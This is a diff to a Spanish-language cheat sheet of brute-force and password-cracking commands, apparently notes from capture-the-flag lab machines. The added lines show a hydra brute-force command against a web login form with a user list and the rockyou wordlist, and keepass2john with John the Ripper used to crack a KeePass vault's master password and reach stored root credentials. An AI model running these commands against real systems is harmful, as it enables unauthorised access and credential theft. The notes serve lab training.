@@ -1,6 +1,6 @@
 # Fuerza bruta y crackeo de hashes
 
-Comandos usados en **CACHOPO**, **GOIKO**, **PapaFirta**, **Soporte**, **THE AVENGERS** y **PROXY**.
+Comandos usados en **CACHOPO**, **GOIKO**, **PapaFirta**, **Soporte**, **THE AVENGERS**, **PROXY**, **Domino** y **Monitor silencioso**.
 
 ## 1. Fuerza bruta SSH con hydra
 
@@ -42,6 +42,16 @@ Estructura de `http-post-form`:
 
 - `^USER^` y `^PASS^` → se sustituyen por cada intento.
 - `F=Invalid credentials` → cadena que aparece cuando el login falla; si no la pones, hydra marca falsos positivos.
+
+Con lista de usuarios (uno por línea) y sin guardar resultados intermedios (`-I`), como en **Domino**:
+
+```
+hydra -L usuarios.txt -P /usr/share/wordlists/rockyou.txt <IP> http-post-form \
+  '/index.php:username=^USER^&password=^PASS^:Invalid credentials' -I
+```
+
+- `-L` → archivo con usuarios (frente a `-l`, que es un solo usuario).
+- `-I` → no crea el fichero de resultados intermedios (evita reanudar por error una ejecución anterior).
 
 ## 3. Diccionario de usuarios con CeWL
 
@@ -89,6 +99,17 @@ john --format=krb5asrep asrep.hash --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
 - hashcat → modo **`18200`**; john → formato **`krb5asrep`**.
+
+**Vault KeePass (`.kdbx`)** (como en **Monitor silencioso**):
+
+```
+keepass2john vault.kdbx > hash.txt
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
+
+- `keepass2john` convierte el vault a un hash que John entiende (sale como `KeePass [AES/Argon2 256/256]`).
+- Si el `keepass2john` de la distro falla con KDBX4, usar el del repo jumbo de John: `~/john/run/keepass2john`.
+- La master password descubre las entradas del vault, que suelen contener contraseñas de otros usuarios (p. ej. la de `root`).
 
 **Ver la contraseña descubierta:**
 
